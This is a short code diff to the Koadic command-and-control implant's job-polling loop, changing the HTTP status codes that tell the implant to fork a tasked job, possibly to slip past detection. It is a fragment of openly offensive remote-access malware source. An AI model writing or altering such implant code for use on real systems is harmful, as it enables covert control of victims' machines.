@@ -48,11 +48,11 @@ function DoWork()
         var work = Koadic.work.get();
         // 201 = x64 or x86
         // 202 = force x86
-        if (work.status == 201 || work.status == 202)
+        if (work.status == 501 || work.status == 502)
         {
             if (work.responseText.length > 0) {
                 var jobkey = work.responseText;
-                Koadic.work.fork(jobkey, work.status == 202);
+                Koadic.work.fork(jobkey, work.status == 502);
             }
         }
         else // if (work.status == 500) // kill code
